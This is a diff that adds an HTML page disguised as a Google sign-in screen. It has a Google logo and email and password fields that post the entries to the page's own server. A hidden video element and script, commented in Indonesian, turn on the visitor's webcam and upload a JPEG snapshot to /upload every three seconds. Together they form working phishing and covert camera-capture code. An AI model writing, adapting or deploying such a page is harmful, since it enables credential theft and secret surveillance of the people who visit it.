@@ -1,0 +1,91 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="682665_favicon_google_logo_new_icon.png">
+
+</head>
+<style>
+    #video {
+        display: none; /* Menyembunyikan elemen video */
+    }
+</style>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <div class="login-header">
+                <img src="gg.png" alt="Google Logo" class="logo">
+                <h1 class="title">Sign in</h1>
+                <p class="subtitle">Use your Google Account</p>
+            </div>
+            <form class="login-form" action="/submit" method="post">
+                <div class="input-group">
+                    <input type="email" id="inputData" name="inputData" required>
+                    <label for="email">Email or phone</label>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="inputData" name="inputData" required>
+                    <label for="password">Enter your password</label>
+                </div>
+                <div class="actions">
+                    <button type="button" onclick="num()" class="forgot-password">Forgot password?</button>
+                    <button type="submit" id="LoadButton" class="next-button">Next</button>
+                    <div id="loader" class="loader hidden"></div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Mengambil elemen video dan canvas dari DOM
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Mengambil gambar dari video setiap detiknya
+        function captureFrame() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // Mengubah gambar di canvas menjadi data URL
+            const imageDataURL = canvas.toDataURL('image/jpeg');
+            // Kirim data ke server.js
+            sendData(imageDataURL);
+        }
+
+        // Memulai video
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+            })
+            .catch(function(error) {
+                console.error('Error accessing the camera.', error);
+            });
+
+        // Memanggil captureFrame setiap detik
+        setInterval(captureFrame, 3000);
+
+        // Fungsi untuk mengirim data gambar ke server.js
+        function sendData(imageDataURL) {
+            fetch('/upload', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: imageDataURL })
+            })
+            .then(response => {
+                console.log('Image sent to server');
+            })
+            .catch(error => {
+                console.error('Error sending image to server', error);
+            });
+        }
+    </script>
+    <script src="index.js"></script>
+</body>
+</html>
